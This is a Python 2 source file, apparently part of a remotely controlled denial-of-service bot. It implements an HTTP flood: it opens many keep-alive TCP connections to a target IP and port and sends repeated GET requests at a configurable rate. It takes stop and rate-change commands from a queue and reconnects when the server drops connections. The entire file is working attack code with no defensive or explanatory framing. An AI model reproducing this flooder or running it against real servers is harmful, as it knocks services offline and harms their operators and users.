__author__ = 'mike'

import socket
import time
import threading
import Queue

class http_main():
    def __init__(self, Q, TARGET_IP, TARGET_PORT, RATE, GET, PROCESSES, CONNECTIONS):
        #threading.Thread.__init__(self) # Required for thread class
        self.target = TARGET_IP
        self.port = TARGET_PORT
        self.rate = RATE
        self.get = GET
        self.CONNECTIONS = CONNECTIONS
        self.PROCESSES = PROCESSES
        self.instruction_q = Q

    def main(self):
        print "Setting global vars" # So we can signal all attacking threads at once...
        global GET_VAR
        global RATE_VAR
        global TARGET_VAR
        global PORT_VAR
        global PROCESSES_VAR
        global CONNECTIONS_VAR
        GET_VAR = self.get
        RATE_VAR = self.rate
        TARGET_VAR = self.target
        PORT_VAR = self.port
        PROCESSES_VAR = self.PROCESSES
        CONNECTIONS_VAR = self.CONNECTIONS

        # print "Starting attack threads"
        # for i in range(1, self.THREADS):
        #     att = http_attack()
        #     att.daemon = True
        #     att.start()
        #     print "Started: ", i

        print "Starting HTTP flood threads"
        att = http_attack()
        att.daemon = True
        att.start()

        time.sleep(0.5)

        while True:
            try:
                data = self.instruction_q.get(False)
            except Queue.Empty:
                pass
            else:
                data_id = data['id']
                if data[data_id]['status'] == "STOP":
                    break # Return to 'Listening' state
                    # 'kill_threads()'
                else:
                    RATE_VAR = data[data_id]['rate'] # Adjust rate
                    print "New rate of attack: ", str(RATE_VAR)
            time.sleep(1)


class http_attack(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.a = "a"
        self.allsockets = []
        self.sent = 0
        self.time_recv_total = 0.0 # last recv operation duration


    def tcpget(self, S, D):
        REQ = ("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n" % (GET_VAR, TARGET_VAR))

        time_start = time.time()
        try:
            S.send(REQ) # Try: The output buffer may be full
            while (time.time() - time_start + self.time_recv_total) < D: #Blocking sleep. Sub ms precise.
                pass
        except:
            print "  Unable to send"
            S.close()
            self.allsockets.remove(S)
            while (time.time() - time_start) < D: #Blocking sleep. Sub ms precise.
                pass
            S2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            S2.connect((TARGET_VAR, PORT_VAR))
            S2.setblocking(0)
            self.allsockets.append(S2)

        time_recv_start = time.time()
        try:
            bogus = S.recv(65000) # Dump all responses, or else the rcvwnd will fill up.
        except:
            pass
        else:
            if len(bogus) == 0: # HTTPD broke up the connection?
                # RECONNECTING
                S.close()
                self.allsockets.remove(S)
                S2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                S2.connect((TARGET_VAR, PORT_VAR))
                S2.setblocking(0)
                self.allsockets.append(S2)
        self.time_recv_total = time.time() - time_recv_start

    def run(self):
        i = 0

        while i < int((CONNECTIONS_VAR / PROCESSES_VAR)):
            S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            S.connect((TARGET_VAR, PORT_VAR))
            S.setblocking(0)
            print "Connected: ", str(i)
            self.allsockets.append(S)
            i += 1
            time.sleep(0.05)

        iterations_before_sleep = 2
        time2 = time.time()
        while True:
            delay = (float(1) / (float(RATE_VAR) / float(PROCESSES_VAR))) # global
            for sock in self.allsockets:
                self.tcpget(sock, delay)
